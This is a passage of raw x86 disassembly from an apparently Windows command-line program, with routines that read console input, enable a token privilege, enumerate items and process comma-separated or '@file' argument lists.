  402bfe:	56                   	push   %esi
  402bff:	51                   	push   %ecx
  402c00:	e8 fb f8 ff ff       	call   0x402500
  402c05:	83 c4 10             	add    $0x10,%esp
  402c08:	32 c0                	xor    %al,%al
  402c0a:	eb a4                	jmp    0x402bb0
  402c0c:	cc                   	int3
  402c0d:	cc                   	int3
  402c0e:	cc                   	int3
  402c0f:	cc                   	int3
  402c10:	55                   	push   %ebp
  402c11:	8b ec                	mov    %esp,%ebp
  402c13:	83 ec 08             	sub    $0x8,%esp
  402c16:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  402c1b:	33 c5                	xor    %ebp,%eax
  402c1d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402c20:	53                   	push   %ebx
  402c21:	56                   	push   %esi
  402c22:	57                   	push   %edi
  402c23:	8b 7d 0c             	mov    0xc(%ebp),%edi
  402c26:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402c2d:	85 ff                	test   %edi,%edi
  402c2f:	0f 84 b4 00 00 00    	je     0x402ce9
  402c35:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402c38:	85 db                	test   %ebx,%ebx
  402c3a:	0f 84 a9 00 00 00    	je     0x402ce9
  402c40:	8b c7                	mov    %edi,%eax
  402c42:	8d 50 01             	lea    0x1(%eax),%edx
  402c45:	8a 08                	mov    (%eax),%cl
  402c47:	40                   	inc    %eax
  402c48:	84 c9                	test   %cl,%cl
  402c4a:	75 f9                	jne    0x402c45
  402c4c:	2b c2                	sub    %edx,%eax
  402c4e:	83 c0 08             	add    $0x8,%eax
  402c51:	e8 4a 2d 00 00       	call   0x4059a0
  402c56:	8b f4                	mov    %esp,%esi
  402c58:	8b d6                	mov    %esi,%edx
  402c5a:	8b c7                	mov    %edi,%eax
  402c5c:	2b d7                	sub    %edi,%edx
  402c5e:	8b ff                	mov    %edi,%edi
  402c60:	8a 08                	mov    (%eax),%cl
  402c62:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  402c65:	40                   	inc    %eax
  402c66:	84 c9                	test   %cl,%cl
  402c68:	75 f6                	jne    0x402c60
  402c6a:	6a 5c                	push   $0x5c
  402c6c:	56                   	push   %esi
  402c6d:	e8 f5 21 00 00       	call   0x404e67
  402c72:	83 c4 08             	add    $0x8,%esp
  402c75:	85 c0                	test   %eax,%eax
  402c77:	74 08                	je     0x402c81
  402c79:	c6 00 00             	movb   $0x0,(%eax)
  402c7c:	8b ce                	mov    %esi,%ecx
  402c7e:	40                   	inc    %eax
  402c7f:	eb 07                	jmp    0x402c88
  402c81:	b9 9c 0a 42 00       	mov    $0x420a9c,%ecx
  402c86:	8b c6                	mov    %esi,%eax
  402c88:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402c8b:	52                   	push   %edx
  402c8c:	6a 03                	push   $0x3
  402c8e:	6a 09                	push   $0x9
  402c90:	53                   	push   %ebx
  402c91:	51                   	push   %ecx
  402c92:	50                   	push   %eax
  402c93:	ff 15 10 e0 41 00    	call   *0x41e010
  402c99:	84 c0                	test   %al,%al
  402c9b:	75 2a                	jne    0x402cc7
  402c9d:	ff 15 18 e1 41 00    	call   *0x41e118
  402ca3:	8b f0                	mov    %eax,%esi
  402ca5:	8b 45 08             	mov    0x8(%ebp),%eax
  402ca8:	50                   	push   %eax
  402ca9:	68 84 0a 42 00       	push   $0x420a84
  402cae:	e8 82 25 00 00       	call   0x405235
  402cb3:	83 c0 40             	add    $0x40,%eax
  402cb6:	50                   	push   %eax
  402cb7:	e8 d3 23 00 00       	call   0x40508f
  402cbc:	56                   	push   %esi
  402cbd:	e8 6e f5 ff ff       	call   0x402230
  402cc2:	83 c4 10             	add    $0x10,%esp
  402cc5:	eb 6d                	jmp    0x402d34
  402cc7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402cca:	51                   	push   %ecx
  402ccb:	ff 15 14 e0 41 00    	call   *0x41e014
  402cd1:	84 c0                	test   %al,%al
  402cd3:	75 14                	jne    0x402ce9
  402cd5:	ff 15 18 e1 41 00    	call   *0x41e118
  402cdb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402cde:	52                   	push   %edx
  402cdf:	8b f0                	mov    %eax,%esi
  402ce1:	ff 15 20 e1 41 00    	call   *0x41e120
  402ce7:	eb bc                	jmp    0x402ca5
  402ce9:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402cec:	8b 55 14             	mov    0x14(%ebp),%edx
  402cef:	8b 7d 08             	mov    0x8(%ebp),%edi
  402cf2:	51                   	push   %ecx
  402cf3:	52                   	push   %edx
  402cf4:	57                   	push   %edi
  402cf5:	ff 15 18 e0 41 00    	call   *0x41e018
  402cfb:	8b f0                	mov    %eax,%esi
  402cfd:	85 f6                	test   %esi,%esi
  402cff:	74 1d                	je     0x402d1e
  402d01:	57                   	push   %edi
  402d02:	68 58 0a 42 00       	push   $0x420a58
  402d07:	e8 29 25 00 00       	call   0x405235
  402d0c:	83 c0 40             	add    $0x40,%eax
  402d0f:	50                   	push   %eax
  402d10:	e8 7a 23 00 00       	call   0x40508f
  402d15:	56                   	push   %esi
  402d16:	e8 15 f5 ff ff       	call   0x402230
  402d1b:	83 c4 10             	add    $0x10,%esp
  402d1e:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402d22:	74 10                	je     0x402d34
  402d24:	ff 15 1c e0 41 00    	call   *0x41e01c
  402d2a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402d2d:	50                   	push   %eax
  402d2e:	ff 15 20 e1 41 00    	call   *0x41e120
  402d34:	8b c6                	mov    %esi,%eax
  402d36:	8d 65 ec             	lea    -0x14(%ebp),%esp
  402d39:	5f                   	pop    %edi
  402d3a:	5e                   	pop    %esi
  402d3b:	5b                   	pop    %ebx
  402d3c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d3f:	33 cd                	xor    %ebp,%ecx
  402d41:	e8 d0 16 00 00       	call   0x404416
  402d46:	8b e5                	mov    %ebp,%esp
  402d48:	5d                   	pop    %ebp
  402d49:	c3                   	ret
  402d4a:	cc                   	int3
  402d4b:	cc                   	int3
  402d4c:	cc                   	int3
  402d4d:	cc                   	int3
  402d4e:	cc                   	int3
  402d4f:	cc                   	int3
  402d50:	53                   	push   %ebx
  402d51:	56                   	push   %esi
  402d52:	57                   	push   %edi
  402d53:	68 a4 0a 42 00       	push   $0x420aa4
  402d58:	e8 89 32 00 00       	call   0x405fe6
  402d5d:	e8 d3 24 00 00       	call   0x405235
  402d62:	83 c0 20             	add    $0x20,%eax
  402d65:	50                   	push   %eax
  402d66:	e8 1f 32 00 00       	call   0x405f8a
  402d6b:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402d6f:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402d73:	83 c4 08             	add    $0x8,%esp
  402d76:	33 f6                	xor    %esi,%esi
  402d78:	83 c7 ff             	add    $0xffffffff,%edi
  402d7b:	74 14                	je     0x402d91
  402d7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402d80:	e8 c1 2f 00 00       	call   0x405d46
  402d85:	3c 0d                	cmp    $0xd,%al
  402d87:	74 08                	je     0x402d91
  402d89:	88 04 1e             	mov    %al,(%esi,%ebx,1)
  402d8c:	46                   	inc    %esi
  402d8d:	3b f7                	cmp    %edi,%esi
  402d8f:	72 ef                	jb     0x402d80
  402d91:	68 a0 0a 42 00       	push   $0x420aa0
  402d96:	c6 04 1e 00          	movb   $0x0,(%esi,%ebx,1)
  402d9a:	e8 47 32 00 00       	call   0x405fe6
  402d9f:	83 c4 04             	add    $0x4,%esp
  402da2:	5f                   	pop    %edi
  402da3:	5e                   	pop    %esi
  402da4:	5b                   	pop    %ebx
  402da5:	c3                   	ret
  402da6:	cc                   	int3
  402da7:	cc                   	int3
  402da8:	cc                   	int3
  402da9:	cc                   	int3
  402daa:	cc                   	int3
  402dab:	cc                   	int3
  402dac:	cc                   	int3
  402dad:	cc                   	int3
  402dae:	cc                   	int3
  402daf:	cc                   	int3
  402db0:	83 ec 1c             	sub    $0x1c,%esp
  402db3:	8d 04 24             	lea    (%esp),%eax
  402db6:	50                   	push   %eax
  402db7:	6a 28                	push   $0x28
  402db9:	ff 15 ac e0 41 00    	call   *0x41e0ac
  402dbf:	50                   	push   %eax
  402dc0:	ff 15 04 e0 41 00    	call   *0x41e004
  402dc6:	85 c0                	test   %eax,%eax
  402dc8:	75 06                	jne    0x402dd0
  402dca:	32 c0                	xor    %al,%al
  402dcc:	83 c4 1c             	add    $0x1c,%esp
  402dcf:	c3                   	ret
  402dd0:	8b 54 24 20          	mov    0x20(%esp),%edx
  402dd4:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402dd8:	51                   	push   %ecx
  402dd9:	52                   	push   %edx
  402dda:	6a 00                	push   $0x0
  402ddc:	ff 15 08 e0 41 00    	call   *0x41e008
  402de2:	85 c0                	test   %eax,%eax
  402de4:	74 e4                	je     0x402dca
  402de6:	8b 44 24 04          	mov    0x4(%esp),%eax
  402dea:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402dee:	53                   	push   %ebx
  402def:	6a 00                	push   $0x0
  402df1:	6a 00                	push   $0x0
  402df3:	6a 10                	push   $0x10
  402df5:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402df9:	52                   	push   %edx
  402dfa:	89 44 24 24          	mov    %eax,0x24(%esp)
  402dfe:	8b 44 24 14          	mov    0x14(%esp),%eax
  402e02:	6a 00                	push   $0x0
  402e04:	50                   	push   %eax
  402e05:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%esp)
  402e0c:	00 
  402e0d:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402e11:	c7 44 24 34 02 00 00 	movl   $0x2,0x34(%esp)
  402e18:	00 
  402e19:	ff 15 0c e0 41 00    	call   *0x41e00c
  402e1f:	8b d8                	mov    %eax,%ebx
  402e21:	85 db                	test   %ebx,%ebx
  402e23:	74 0c                	je     0x402e31
  402e25:	ff 15 18 e1 41 00    	call   *0x41e118
  402e2b:	85 c0                	test   %eax,%eax
  402e2d:	74 02                	je     0x402e31
  402e2f:	33 db                	xor    %ebx,%ebx
  402e31:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402e35:	51                   	push   %ecx
  402e36:	ff 15 20 e1 41 00    	call   *0x41e120
  402e3c:	8a c3                	mov    %bl,%al
  402e3e:	5b                   	pop    %ebx
  402e3f:	83 c4 1c             	add    $0x1c,%esp
  402e42:	c3                   	ret
  402e43:	cc                   	int3
  402e44:	cc                   	int3
  402e45:	cc                   	int3
  402e46:	cc                   	int3
  402e47:	cc                   	int3
  402e48:	cc                   	int3
  402e49:	cc                   	int3
  402e4a:	cc                   	int3
  402e4b:	cc                   	int3
  402e4c:	cc                   	int3
  402e4d:	cc                   	int3
  402e4e:	cc                   	int3
  402e4f:	cc                   	int3
  402e50:	81 ec 20 01 00 00    	sub    $0x120,%esp
  402e56:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  402e5b:	33 c4                	xor    %esp,%eax
  402e5d:	89 84 24 1c 01 00 00 	mov    %eax,0x11c(%esp)
  402e64:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  402e6b:	53                   	push   %ebx
  402e6c:	55                   	push   %ebp
  402e6d:	33 db                	xor    %ebx,%ebx
  402e6f:	56                   	push   %esi
  402e70:	bd 01 00 00 00       	mov    $0x1,%ebp
  402e75:	68 dc 0a 42 00       	push   $0x420adc
  402e7a:	89 44 24 20          	mov    %eax,0x20(%esp)
  402e7e:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402e82:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  402e86:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  402e8a:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402e8e:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  402e92:	e8 9e 23 00 00       	call   0x405235
  402e97:	83 c0 40             	add    $0x40,%eax
  402e9a:	50                   	push   %eax
  402e9b:	e8 ef 21 00 00       	call   0x40508f
  402ea0:	83 c4 08             	add    $0x8,%esp
  402ea3:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402ea7:	51                   	push   %ecx
  402ea8:	53                   	push   %ebx
  402ea9:	6a 03                	push   $0x3
  402eab:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  402eaf:	52                   	push   %edx
  402eb0:	8d 44 24 20          	lea    0x20(%esp),%eax
  402eb4:	50                   	push   %eax
  402eb5:	6a ff                	push   $0xffffffff
  402eb7:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402ebb:	51                   	push   %ecx
  402ebc:	6a 65                	push   $0x65
  402ebe:	53                   	push   %ebx
  402ebf:	e8 f6 0e 00 00       	call   0x403dba
  402ec4:	3b c3                	cmp    %ebx,%eax
  402ec6:	74 24                	je     0x402eec
  402ec8:	3d ea 00 00 00       	cmp    $0xea,%eax
  402ecd:	74 1d                	je     0x402eec
  402ecf:	50                   	push   %eax
  402ed0:	68 b8 0a 42 00       	push   $0x420ab8
  402ed5:	e8 5b 23 00 00       	call   0x405235
  402eda:	83 c0 40             	add    $0x40,%eax
  402edd:	50                   	push   %eax
  402ede:	e8 ac 21 00 00       	call   0x40508f
  402ee3:	8b 74 24 18          	mov    0x18(%esp),%esi
  402ee7:	83 c4 0c             	add    $0xc,%esp
  402eea:	eb 73                	jmp    0x402f5f
  402eec:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402ef0:	3b f3                	cmp    %ebx,%esi
  402ef2:	74 75                	je     0x402f69
  402ef4:	57                   	push   %edi
  402ef5:	33 ff                	xor    %edi,%edi
  402ef7:	39 5c 24 14          	cmp    %ebx,0x14(%esp)
  402efb:	76 61                	jbe    0x402f5e
  402efd:	8b 2d b0 e0 41 00    	mov    0x41e0b0,%ebp
  402f03:	3b f3                	cmp    %ebx,%esi
  402f05:	74 4f                	je     0x402f56
  402f07:	8b 46 04             	mov    0x4(%esi),%eax
  402f0a:	53                   	push   %ebx
  402f0b:	53                   	push   %ebx
  402f0c:	68 04 01 00 00       	push   $0x104
  402f11:	8d 54 24 34          	lea    0x34(%esp),%edx
  402f15:	52                   	push   %edx
  402f16:	6a ff                	push   $0xffffffff
  402f18:	50                   	push   %eax
  402f19:	53                   	push   %ebx
  402f1a:	53                   	push   %ebx
  402f1b:	ff d5                	call   *%ebp
  402f1d:	38 9c 24 34 01 00 00 	cmp    %bl,0x134(%esp)
  402f24:	74 12                	je     0x402f38
  402f26:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402f2a:	51                   	push   %ecx
  402f2b:	68 b0 0a 42 00       	push   $0x420ab0
  402f30:	e8 b1 30 00 00       	call   0x405fe6
  402f35:	83 c4 08             	add    $0x8,%esp
  402f38:	8d 54 24 28          	lea    0x28(%esp),%edx
  402f3c:	52                   	push   %edx
  402f3d:	ff 54 24 24          	call   *0x24(%esp)
  402f41:	83 c4 04             	add    $0x4,%esp
  402f44:	85 c0                	test   %eax,%eax
  402f46:	75 04                	jne    0x402f4c
  402f48:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402f4c:	47                   	inc    %edi
  402f4d:	83 c6 18             	add    $0x18,%esi
  402f50:	3b 7c 24 14          	cmp    0x14(%esp),%edi
  402f54:	72 ad                	jb     0x402f03
  402f56:	8b 74 24 10          	mov    0x10(%esp),%esi
  402f5a:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402f5e:	5f                   	pop    %edi
  402f5f:	3b f3                	cmp    %ebx,%esi
  402f61:	74 06                	je     0x402f69
  402f63:	56                   	push   %esi
  402f64:	e8 4b 0e 00 00       	call   0x403db4
  402f69:	8b 8c 24 28 01 00 00 	mov    0x128(%esp),%ecx
  402f70:	5e                   	pop    %esi
  402f71:	8b c5                	mov    %ebp,%eax
  402f73:	5d                   	pop    %ebp
  402f74:	5b                   	pop    %ebx
  402f75:	33 cc                	xor    %esp,%ecx
  402f77:	e8 9a 14 00 00       	call   0x404416
  402f7c:	81 c4 20 01 00 00    	add    $0x120,%esp
  402f82:	c3                   	ret
  402f83:	cc                   	int3
  402f84:	cc                   	int3
  402f85:	cc                   	int3
  402f86:	cc                   	int3
  402f87:	cc                   	int3
  402f88:	cc                   	int3
  402f89:	cc                   	int3
  402f8a:	cc                   	int3
  402f8b:	cc                   	int3
  402f8c:	cc                   	int3
  402f8d:	cc                   	int3
  402f8e:	cc                   	int3
  402f8f:	cc                   	int3
  402f90:	81 ec 08 01 00 00    	sub    $0x108,%esp
  402f96:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  402f9b:	33 c4                	xor    %esp,%eax
  402f9d:	89 84 24 04 01 00 00 	mov    %eax,0x104(%esp)
  402fa4:	53                   	push   %ebx
  402fa5:	8b 9c 24 18 01 00 00 	mov    0x118(%esp),%ebx
  402fac:	55                   	push   %ebp
  402fad:	56                   	push   %esi
  402fae:	8b b4 24 1c 01 00 00 	mov    0x11c(%esp),%esi
  402fb5:	57                   	push   %edi
  402fb6:	68 08 0b 42 00       	push   $0x420b08
  402fbb:	56                   	push   %esi
  402fbc:	bd 01 00 00 00       	mov    $0x1,%ebp
  402fc1:	e8 bf 27 00 00       	call   0x405785
  402fc6:	8b f8                	mov    %eax,%edi
  402fc8:	83 c4 08             	add    $0x8,%esp
  402fcb:	85 ff                	test   %edi,%edi
  402fcd:	75 28                	jne    0x402ff7
  402fcf:	56                   	push   %esi
  402fd0:	68 f4 0a 42 00       	push   $0x420af4
  402fd5:	e8 5b 22 00 00       	call   0x405235
  402fda:	83 c0 40             	add    $0x40,%eax
  402fdd:	50                   	push   %eax
  402fde:	e8 ac 20 00 00       	call   0x40508f
  402fe3:	83 c4 0c             	add    $0xc,%esp
  402fe6:	ff 15 18 e1 41 00    	call   *0x41e118
  402fec:	50                   	push   %eax
  402fed:	e8 3e f2 ff ff       	call   0x402230
  402ff2:	e9 8e 00 00 00       	jmp    0x403085
  402ff7:	57                   	push   %edi
  402ff8:	8d 44 24 14          	lea    0x14(%esp),%eax
  402ffc:	68 04 01 00 00       	push   $0x104
  403001:	50                   	push   %eax
  403002:	e8 49 31 00 00       	call   0x406150
  403007:	83 c4 0c             	add    $0xc,%esp
  40300a:	85 c0                	test   %eax,%eax
  40300c:	74 71                	je     0x40307f
  40300e:	8b ff                	mov    %edi,%edi
  403010:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403014:	6a 0a                	push   $0xa
  403016:	51                   	push   %ecx
  403017:	e8 4b 1e 00 00       	call   0x404e67
  40301c:	83 c4 08             	add    $0x8,%esp
  40301f:	85 c0                	test   %eax,%eax
  403021:	74 12                	je     0x403035
  403023:	8d 54 24 10          	lea    0x10(%esp),%edx
  403027:	6a 0a                	push   $0xa
  403029:	52                   	push   %edx
  40302a:	e8 38 1e 00 00       	call   0x404e67
  40302f:	83 c4 08             	add    $0x8,%esp
  403032:	c6 00 00             	movb   $0x0,(%eax)
  403035:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  40303a:	74 2c                	je     0x403068
  40303c:	80 bc 24 1c 01 00 00 	cmpb   $0x0,0x11c(%esp)
  403043:	00 
  403044:	74 12                	je     0x403058
  403046:	8d 44 24 10          	lea    0x10(%esp),%eax
  40304a:	50                   	push   %eax
  40304b:	68 b0 0a 42 00       	push   $0x420ab0
  403050:	e8 91 2f 00 00       	call   0x405fe6
  403055:	83 c4 08             	add    $0x8,%esp
  403058:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40305c:	51                   	push   %ecx
  40305d:	ff d3                	call   *%ebx
  40305f:	83 c4 04             	add    $0x4,%esp
  403062:	85 c0                	test   %eax,%eax
  403064:	75 02                	jne    0x403068
  403066:	33 ed                	xor    %ebp,%ebp
  403068:	57                   	push   %edi
  403069:	8d 54 24 14          	lea    0x14(%esp),%edx
  40306d:	68 04 01 00 00       	push   $0x104
  403072:	52                   	push   %edx
  403073:	e8 d8 30 00 00       	call   0x406150
  403078:	83 c4 0c             	add    $0xc,%esp
  40307b:	85 c0                	test   %eax,%eax
  40307d:	75 91                	jne    0x403010
  40307f:	57                   	push   %edi
  403080:	e8 dc 23 00 00       	call   0x405461
  403085:	8b 8c 24 18 01 00 00 	mov    0x118(%esp),%ecx
  40308c:	83 c4 04             	add    $0x4,%esp
  40308f:	5f                   	pop    %edi
  403090:	5e                   	pop    %esi
  403091:	8b c5                	mov    %ebp,%eax
  403093:	5d                   	pop    %ebp
  403094:	5b                   	pop    %ebx
  403095:	33 cc                	xor    %esp,%ecx
  403097:	e8 7a 13 00 00       	call   0x404416
  40309c:	81 c4 08 01 00 00    	add    $0x108,%esp
  4030a2:	c3                   	ret
  4030a3:	cc                   	int3
  4030a4:	cc                   	int3
  4030a5:	cc                   	int3
  4030a6:	cc                   	int3
  4030a7:	cc                   	int3
  4030a8:	cc                   	int3
  4030a9:	cc                   	int3
  4030aa:	cc                   	int3
  4030ab:	cc                   	int3
  4030ac:	cc                   	int3
  4030ad:	cc                   	int3
  4030ae:	cc                   	int3
  4030af:	cc                   	int3
  4030b0:	53                   	push   %ebx
  4030b1:	8a 5c 24 08          	mov    0x8(%esp),%bl
  4030b5:	55                   	push   %ebp
  4030b6:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4030ba:	56                   	push   %esi
  4030bb:	8b 74 24 14          	mov    0x14(%esp),%esi
  4030bf:	57                   	push   %edi
  4030c0:	bf 01 00 00 00       	mov    $0x1,%edi
  4030c5:	6a 2c                	push   $0x2c
  4030c7:	56                   	push   %esi
  4030c8:	e8 9a 1d 00 00       	call   0x404e67
  4030cd:	83 c4 08             	add    $0x8,%esp
  4030d0:	85 c0                	test   %eax,%eax
  4030d2:	74 0e                	je     0x4030e2
  4030d4:	6a 2c                	push   $0x2c
  4030d6:	56                   	push   %esi
  4030d7:	e8 8b 1d 00 00       	call   0x404e67
  4030dc:	83 c4 08             	add    $0x8,%esp
  4030df:	c6 00 00             	movb   $0x0,(%eax)
  4030e2:	84 db                	test   %bl,%bl
  4030e4:	74 0e                	je     0x4030f4
  4030e6:	56                   	push   %esi
  4030e7:	68 b0 0a 42 00       	push   $0x420ab0
  4030ec:	e8 f5 2e 00 00       	call   0x405fe6
  4030f1:	83 c4 08             	add    $0x8,%esp
  4030f4:	56                   	push   %esi
  4030f5:	ff d5                	call   *%ebp
  4030f7:	83 c4 04             	add    $0x4,%esp
  4030fa:	85 c0                	test   %eax,%eax
  4030fc:	75 02                	jne    0x403100
  4030fe:	33 ff                	xor    %edi,%edi
  403100:	8b c6                	mov    %esi,%eax
  403102:	8d 50 01             	lea    0x1(%eax),%edx
  403105:	8a 08                	mov    (%eax),%cl
  403107:	40                   	inc    %eax
  403108:	84 c9                	test   %cl,%cl
  40310a:	75 f9                	jne    0x403105
  40310c:	2b c2                	sub    %edx,%eax
  40310e:	38 4c 06 01          	cmp    %cl,0x1(%esi,%eax,1)
  403112:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403116:	75 ad                	jne    0x4030c5
  403118:	8b c7                	mov    %edi,%eax
  40311a:	5f                   	pop    %edi
  40311b:	5e                   	pop    %esi
  40311c:	5d                   	pop    %ebp
  40311d:	5b                   	pop    %ebx
  40311e:	c3                   	ret
  40311f:	cc                   	int3
  403120:	56                   	push   %esi
  403121:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403125:	80 3e 40             	cmpb   $0x40,(%esi)
  403128:	75 16                	jne    0x403140
  40312a:	8b 44 24 10          	mov    0x10(%esp),%eax
  40312e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403132:	50                   	push   %eax
  403133:	46                   	inc    %esi
  403134:	56                   	push   %esi
  403135:	51                   	push   %ecx
  403136:	e8 55 fe ff ff       	call   0x402f90
  40313b:	83 c4 0c             	add    $0xc,%esp
  40313e:	5e                   	pop    %esi
  40313f:	c3                   	ret
  403140:	68 0c 0b 42 00       	push   $0x420b0c
  403145:	56                   	push   %esi
  403146:	e8 2d 1f 00 00       	call   0x405078
  40314b:	83 c4 08             	add    $0x8,%esp
  40314e:	85 c0                	test   %eax,%eax
  403150:	75 14                	jne    0x403166
  403152:	8b 54 24 10          	mov    0x10(%esp),%edx
  403156:	8b 44 24 08          	mov    0x8(%esp),%eax
  40315a:	52                   	push   %edx
  40315b:	50                   	push   %eax
  40315c:	e8 ef fc ff ff       	call   0x402e50
  403161:	83 c4 08             	add    $0x8,%esp
  403164:	5e                   	pop    %esi
  403165:	c3                   	ret
  403166:	6a 2c                	push   $0x2c
  403168:	56                   	push   %esi
  403169:	e8 f9 1c 00 00       	call   0x404e67
  40316e:	83 c4 08             	add    $0x8,%esp
  403171:	85 c0                	test   %eax,%eax
  403173:	74 15                	je     0x40318a
  403175:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403179:	8b 54 24 08          	mov    0x8(%esp),%edx
  40317d:	51                   	push   %ecx
  40317e:	56                   	push   %esi
  40317f:	52                   	push   %edx
  403180:	e8 2b ff ff ff       	call   0x4030b0
  403185:	83 c4 0c             	add    $0xc,%esp
  403188:	5e                   	pop    %esi
  403189:	c3                   	ret
  40318a:	56                   	push   %esi
  40318b:	ff 54 24 14          	call   *0x14(%esp)
  40318f:	83 c4 04             	add    $0x4,%esp
  403192:	5e                   	pop    %esi
  403193:	c3                   	ret
  403194:	cc                   	int3
  403195:	cc                   	int3
  403196:	cc                   	int3
  403197:	cc                   	int3
  403198:	cc                   	int3
  403199:	cc                   	int3
  40319a:	cc                   	int3
  40319b:	cc                   	int3
  40319c:	cc                   	int3
  40319d:	cc                   	int3
  40319e:	cc                   	int3
  40319f:	cc                   	int3
  4031a0:	55                   	push   %ebp
  4031a1:	8b ec                	mov    %esp,%ebp
  4031a3:	6a fe                	push   $0xfffffffe
  4031a5:	68 00 30 42 00       	push   $0x423000
  4031aa:	68 d0 62 40 00       	push   $0x4062d0
  4031af:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4031b5:	50                   	push   %eax
  4031b6:	81 ec 18 01 00 00    	sub    $0x118,%esp
  4031bc:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  4031c1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  4031c4:	33 c5                	xor    %ebp,%eax
  4031c6:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4031c9:	53                   	push   %ebx
  4031ca:	56                   	push   %esi
  4031cb:	57                   	push   %edi
  4031cc:	50                   	push   %eax
  4031cd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4031d0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4031d6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4031d9:	8b 75 08             	mov    0x8(%ebp),%esi
  4031dc:	8b 45 14             	mov    0x14(%ebp),%eax
  4031df:	33 ff                	xor    %edi,%edi
  4031e1:	89 bd e0 fe ff ff    	mov    %edi,-0x120(%ebp)
  4031e7:	50                   	push   %eax
  4031e8:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4031ec:	50                   	push   %eax
  4031ed:	0f b7 4d 0c          	movzwl 0xc(%ebp),%ecx
  4031f1:	51                   	push   %ecx
  4031f2:	68 10 0b 42 00       	push   $0x420b10
  4031f7:	8d 95 e4 fe ff ff    	lea    -0x11c(%ebp),%edx
  4031fd:	52                   	push   %edx
  4031fe:	e8 52 18 00 00       	call   0x404a55
  403203:	83 c4 14             	add    $0x14,%esp
  403206:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403209:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  40320f:	50                   	push   %eax
  403210:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  403216:	51                   	push   %ecx
  403217:	8d 95 e4 fe ff ff    	lea    -0x11c(%ebp),%edx
  40321d:	52                   	push   %edx
  40321e:	56                   	push   %esi
  40321f:	e8 7e 0b 00 00       	call   0x403da2
  403224:	89 85 e0 fe ff ff    	mov    %eax,-0x120(%ebp)
  40322a:	eb 09                	jmp    0x403235
  40322c:	b8 01 00 00 00       	mov    $0x1,%eax
  403231:	c3                   	ret
  403232:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403235:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40323c:	8b 85 e0 fe ff ff    	mov    -0x120(%ebp),%eax
  403242:	f7 d8                	neg    %eax
  403244:	1b c0                	sbb    %eax,%eax
  403246:	23 85 dc fe ff ff    	and    -0x124(%ebp),%eax
  40324c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40324f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403256:	59                   	pop    %ecx
  403257:	5f                   	pop    %edi
  403258:	5e                   	pop    %esi
  403259:	5b                   	pop    %ebx
  40325a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40325d:	33 cd                	xor    %ebp,%ecx
  40325f:	e8 b2 11 00 00       	call   0x404416
  403264:	8b e5                	mov    %ebp,%esp
  403266:	5d                   	pop    %ebp
  403267:	c3                   	ret
  403268:	cc                   	int3
  403269:	cc                   	int3
  40326a:	cc                   	int3
  40326b:	cc                   	int3
  40326c:	cc                   	int3
  40326d:	cc                   	int3
  40326e:	cc                   	int3
  40326f:	cc                   	int3
  403270:	83 ec 0c             	sub    $0xc,%esp
  403273:	56                   	push   %esi
  403274:	8b 74 24 14          	mov    0x14(%esp),%esi
  403278:	b8 00 04 00 00       	mov    $0x400,%eax
  40327d:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403281:	52                   	push   %edx
  403282:	66 89 44 24 0c       	mov    %ax,0xc(%esp)
  403287:	8d 44 24 08          	lea    0x8(%esp),%eax
  40328b:	50                   	push   %eax
  40328c:	68 2c 0b 42 00       	push   $0x420b2c
